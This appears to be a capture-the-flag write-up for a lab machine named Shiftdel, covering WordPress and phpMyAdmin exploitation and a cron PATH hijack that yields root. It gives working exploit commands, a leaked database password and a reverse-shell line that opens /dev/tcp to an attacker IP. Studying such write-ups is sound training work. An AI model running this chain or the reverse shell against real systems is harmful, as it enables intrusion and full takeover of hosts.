# Shiftdel

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.197.174
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 21:06 +08
Nmap scan report for 192.168.197.174
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8888/tcp open  sun-answerbook
```

Just 2 ports on the website.&#x20;

### Web Enumeration --> WP Creds

Port 80 shows a Wordpress site:

<figure><img src="../../../.gitbook/assets/image (772).png" alt=""><figcaption></figcaption></figure>

Port 8888 on the other hand shows a phpMyAdmin instance:

<figure><img src="../../../.gitbook/assets/image (2595).png" alt=""><figcaption></figcaption></figure>

When we view the page source of port 8888, there is indication of the version running:

<figure><img src="../../../.gitbook/assets/image (1169).png" alt=""><figcaption></figcaption></figure>

This version is vulnerable to an RCE exploit that requires credentials, which we'll keep in mind for now:

```
$ searchsploit phpmyadmin 4.8.1
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1 | php/webapps/44924.txt
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2 | php/webapps/44928.txt
phpMyAdmin 4.8.1 - Remote Code Execution (RCE)             | php/webapps/50457.py
----------------------------------------------------------- ---------------------------------
```

Default credentials don't work with this site. Since there was a Wordpress site available, we can use `wpscan` for some basic enumeration. There was loads of output, but I found this one vulnerability to be the most interesting for now.

```
$ wpscan --api-token <TOKEN> --url http://192.168.197.174/ --enumerate u,t,p
<TRUNCATED>
[+] WordPress version 4.9.6 identified (Insecure, released on 2018-05-17).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.197.174/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.6'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.197.174/, Match: 'WordPress 4.9.6'
 <TRUNCATED>
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
 |
 <TRUNCATED>
```

The rest of the exploits required some form of credentials to exploit, except for this one. To make this work, we just need to visit this site:

```
http://192.168.197.174/?static=1&order=asc
```

The web page then reveals some credentials:

<figure><img src="../../../.gitbook/assets/image (2194).png" alt=""><figcaption></figcaption></figure>

We seem to be an intern at Shiftdel, and it coincides with `wpscan` returning `intern` as a valid user:

```
[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] intern
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

With these credentials, we can login to the dashboard and begin checking out the other vulnerabilities:

<figure><img src="../../../.gitbook/assets/image (2109).png" alt=""><figcaption></figcaption></figure>

### Arbitrary File Deletion --> RCE

`wpscan` revealed many different types of exploits, including an authenticated RCE. However, since we aren't the administrator of Wordpress, it's unlikely that we can directly get RCE through WP. So, I turned my attention towards exploiting phpMyAdmin.&#x20;

Out of all the exploits that are available, it seemed that the Arbitrary File Delete works:

```
[!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
 |     Fixed in: 4.9.7
 |     References:
 |      - https://wpscan.com/vulnerability/42ab2bd9-bbb1-4f25-a632-1811c5130bb4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
 |      - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
 |      - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
 |      - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
 |      - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
 |      - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated File Delete
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/e3ef8976-11cb-4854-837f-786f43cbdf44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 
$ searchsploit wordpress file deletion 4.9.6
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Wordpress 4.9.6 - Arbitrary File Deletion (Authenticated)  | php/webapps/50456.js
WordPress Core < 4.9.6 - (Authenticated) Arbitrary File De | php/webapps/44949.txt
----------------------------------------------------------- ---------------------------------
```

When run on the localhost, it causes the Wordpress instance to start crashing since `wp-config.php` no longer exists and the website cannot do anything without it. Searching more about this file deletion led me to this blog:

{% embed url="https://www.sonarsource.com/blog/wordpress-file-delete-to-code-execution/" %}

To exploit this, we can use the instructions given in the JS file. This involves using the Developer Console and pasting some code within it. Afterwards, we can just execute the function as required:

<figure><img src="../../../.gitbook/assets/image (3339).png" alt=""><figcaption></figcaption></figure>

Once deleted, this kind of breaks the entire website. It just returns source code:

<figure><img src="../../../.gitbook/assets/image (815).png" alt=""><figcaption></figcaption></figure>

Using this, we can view the `wp-config.php` file since the website is no longer executing PHP:

```php
$ curl http://192.168.197.174/wp-config.php      
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'wordpress');

/** MySQL database password */
define('DB_PASSWORD', 'ThinnerATheWaistline348');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
<TRUNCATED>
```

Using this password, we can achieve RCE on phpMyAdmin:

```
$ python3 50457.py 192.168.197.174 8888 / wordpress ThinnerATheWaistline348 id    
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We can then get a reverse shell:

<figure><img src="../../../.gitbook/assets/image (3788).png" alt=""><figcaption></figcaption></figure>

Grab the user flag.

## Privilege Escalation

### Path Hijack --> Root Shell

I ran a `linpeas.sh` scan and it found this:

```
[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs          
/usr/bin/crontab                                                                             
incrontab Not Found
-rw-r--r-- 1 root root 1042 Oct 11  2019 /etc/crontab                                        

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Oct 25  2021 .
drwxr-xr-x 77 root root 4096 Dec 13  2021 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rw-r--r--  1 root root  712 Dec 17  2018 php
-rw-r--r--  1 root root  348 Oct 25  2021 wpclean
```

There's a `wpclean` thing running periodically on the machine. Here's the contents of that script:

```bash
# /etc/cron.d/wpclean: crontab entries to cleanup wordpress uploads folder

HOME=/var/www/html/wordpress/wp-content/uploads
PATH=~/bin:/usr/bin:/bin

# in case the intern do something silly, delete all files with invalid image extension
*/5 * * * * root /usr/bin/find . -type f -not -regex '.*\.\(jpg\|jpeg\|png\|gif\)' -exec bash -c "rm -f {}" \;
```

First thing I noticed was that this was using a custom `HOME` variable, which is included in the `PATH` variable as the first directory and the fact that `www-data` can write to their `HOME` directory. The `rm` binary they execute here does not have the full path, so we can create our own `rm` file that gives a reverse shell when executed.

Here's the contents of my reverse shell:

```bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.45.177/4444 0>&1'
## need to specify full paths!
```

Run these commands:

```bash
cd /var/www/html/wordpress/wp-content/uploads
mkdir bin
cd bin
wget <IP>/rm
chmod +x rm
```

Then, set up a listener port and wait for a few minutes. Eventually, we'll get a `root` shell:

<figure><img src="../../../.gitbook/assets/image (3129).png" alt=""><figcaption></figcaption></figure>
